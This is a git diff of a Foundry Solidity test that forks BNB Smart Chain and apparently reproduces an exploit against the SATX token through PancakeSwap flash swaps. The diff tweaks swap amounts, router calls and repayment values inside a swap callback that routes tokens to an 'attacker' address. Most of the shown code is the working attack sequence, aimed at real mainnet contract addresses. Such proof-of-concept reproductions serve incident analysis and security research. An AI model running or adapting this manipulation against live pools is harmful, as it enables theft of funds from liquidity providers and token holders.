@@ -10,6 +10,8 @@ contract ContractTest is Test {
     IERC20 constant SATX = IERC20(0xFd80a436dA2F4f4C42a5dBFA397064CfEB7D9508);
     IWBNB constant WBNB =
         IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
+    IWBNB constant CAKE =
+        IWBNB(payable(0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82));
     IPancakePair pair_WBNB_SATX =
         IPancakePair(0x927d7adF1Bcee0Fa1da868d2d43417Ca7c6577D4);
     IPancakePair pair_WBNB_CAKE =
@@ -21,6 +23,7 @@ contract ContractTest is Test {
         vm.createSelectFork("bsc", 37914433);
         vm.label(address(SATX), "SATX");
         vm.label(address(WBNB), "WBNB");
+        vm.label(address(CAKE), "CAKE");
         vm.label(address(router), "PancakeSwap Router");
         vm.label(address(pair_WBNB_SATX), "pair_WBNB_SATX");
         vm.label(address(pair_WBNB_CAKE), "pair_WBNB_CAKE");
@@ -45,12 +48,19 @@ contract ContractTest is Test {
             attacker,
             type(uint256).max
         );
+
+        // pair_WBNB_SATX.swap(
+        //     100000000000000,
+        //     SATX.balanceOf(address(pair_WBNB_SATX)) / 2,
+        //     attacker,
+        //     bytes("0x")
+        // );
         console2.log("-- SATX-- ", SATX.balanceOf(attacker));
         router.addLiquidity(
             address(WBNB),
             address(SATX),
             1000000000000000,
-            SATX.balanceOf(address(this)),
+            SATX.balanceOf(attacker),
             0,
             0,
             attacker,
@@ -78,14 +88,9 @@ contract ContractTest is Test {
         uint256 amount1,
         bytes calldata data
     ) external {
-        console2.log("--- ~ sender:", sender, amount0, amount1);
-        console2.log("--- ~ sender:", SATX.balanceOf(address(pair_WBNB_SATX)));
-        console2.log(
-            "--- ~ sender:",
-            msg.sender,
-            address(pair_WBNB_CAKE),
-            address(pair_WBNB_SATX)
-        );
+        console2.log("--- ~ sender1:", amount0, amount1);
+        console2.log("--- ~ sender3:", SATX.balanceOf(address(pair_WBNB_SATX)));
+
         if (msg.sender == address(pair_WBNB_CAKE)) {
             console2.log("1111");
             pair_WBNB_SATX.swap(
@@ -104,19 +109,19 @@ contract ContractTest is Test {
             address[] memory path = new address[](2);
             path[0] = address(SATX);
             path[1] = address(WBNB);
-            router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
+            router.swapExactTokensForTokens(
                 SATX.balanceOf(address(this)),
                 0,
                 path,
                 attacker,
                 type(uint256).max
             );
-            WBNB.transfer(address(pair_WBNB_CAKE), 60150600000000000000);
+            WBNB.transfer(address(pair_WBNB_CAKE), 61000000000000000000);
         } else if (msg.sender == address(pair_WBNB_SATX)) {
             console2.log("2222");
-            WBNB.transfer(address(pair_WBNB_SATX), 52000000000000000000);
+            WBNB.transfer(address(pair_WBNB_SATX), 51000000000000000000);
         }
     }
 
-    fallback() external payable {}
+    //fallback() external payable {}
 }
